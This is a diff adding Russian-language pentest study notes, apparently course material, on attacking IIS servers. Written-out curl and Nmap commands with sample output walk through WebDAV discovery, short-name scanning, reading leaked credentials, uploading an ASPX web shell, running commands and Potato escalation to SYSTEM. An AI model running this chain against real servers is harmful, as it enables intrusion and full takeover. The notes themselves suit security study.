@@ -834,3 +834,74 @@ Gobuster — сканер директорий, поддоменов, вирту
 5. Общие места (для всех)
 - Заголовки безопасности: X-Frame-Options, Content-Security-Policy и др. Их почти никогда нет по умолчанию, о чем стоит упомянуть в отчете.
 - Nikto: автоматический сканер для поиска всего этого безобразия. Шумный, но быстрый.
+
+### (2) Атаки на веб-серверы — 2 (Web Server Attacks - 2)
+
+Суть атаки (метафора)
+IIS — это огромный бизнес-центр, где каждая дверь и лифт управляются системой безопасности. Наша цель — найти ошибки в настройках и, при возможности, пронести свой «груз» (веб-оболочку), чтобы получить контроль над зданием.
+
+1. Разведка: определяем IIS
+curl -I http://10.10.10.10
+Что видим:
+Server: Microsoft-IIS/10.0
+X-Powered-By: ASP.NET
+X-AspNet-Version: 4.0.30319
+Вывод: перед нами IIS версии 10.0, работает с ASP.NET.
+
+2. Проверяем WebDAV
+curl -X OPTIONS http://10.10.10.10 -sv 2>&1 | grep -E "Allow:|DAV:"
+Если WebDAV включён:
+Allow: GET,HEAD,POST,OPTIONS,PUT,DELETE,MOVE,PROPFIND
+DAV: 1,2
+Наличие PUT и MOVE означает, что мы можем загружать файлы.
+
+3. Ищем скрытые папки через короткие имена (8.3)
+python3 iis_shortname_scan.py http://10.10.10.10/
+Пример вывода:
+[Done] /BACKUP~1/
+[Done] /ADMINI~1/
+Эти короткие имена соответствуют полным каталогам BackupFiles и AdminPortal.
+
+4. Читаем секреты из найденной папки
+curl http://10.10.10.10/BackupFiles/
+curl http://10.10.10.10/BackupFiles/webdav_notes.txt
+Находим записку:
+webdav_user / P@ssw0rd!123
+Теперь у нас есть учётные данные для WebDAV.
+
+5. Загружаем ASPX-оболочку через WebDAV
+curl -v --ntlm -u 'webdav_user:P@ssw0rd!123' -T cmd.aspx http://10.10.10.10/webdav/cmd.aspx
+Ответ:
+HTTP/1.1 201 Created
+Файл cmd.aspx успешно загружен.
+
+6. Выполняем команды через веб-оболочку
+curl "http://10.10.10.10/webdav/cmd.aspx?cmd=whoami"
+Результат:
+iis apppool\defaultapppool
+Мы выполняем код от имени учётной записи пула приложений.
+
+7. Повышение привилегий (Potato-атаки)
+Учётная запись iis apppool\defaultapppool имеет SeImpersonatePrivilege. Используем инструменты типа PrintSpoofer, JuicyPotato или GodPotato, чтобы стать SYSTEM.
+Пример запуска Potato-эксплойта через PowerShell
+curl -G "http://10.10.10.10/webdav/cmd.aspx" \
+  --data-urlencode 'cmd=powershell -NoP -NonI -W Hidden -Exec Bypass -c "команда для Potato"
+   
+9. Автоматизация с Nmap NSE
+nmap -sV -p 80 10.10.10.10
+nmap --script http-methods -p 80 10.10.10.10
+nmap --script http-webdav-scan -p 80 10.10.10.10
+nmap --script http-ntlm-info --script-args http-ntlm-info.root=/webdav/ -p 80 10.10.10.10
+Эти скрипты заменяют ручные проверки шагов 2–6.
+
+Частые ошибки конфигурации IIS
+Directory Browsing включён → curl http://IP/uploads/ показывает список файлов.
+Неаутентифицированный WebDAV → OPTIONS показывает PUT без пароля.
+Доступен web.config → curl http://IP/web.config раскрывает строки подключения и ключи.
+Включён trace.axd → curl http://IP/trace.axd возвращает логи с куки и токенами.
+HTTP TRACE активен → curl -X TRACE http://IP отражает запрос.
+Пул работает от SYSTEM → whoami в веб-оболочке показывает nt authority\system.
+
+Итоговая цепочка
+Разведка → WebDAV → короткие имена → секреты → загрузка оболочки → RCE → повышение привилегий.
+
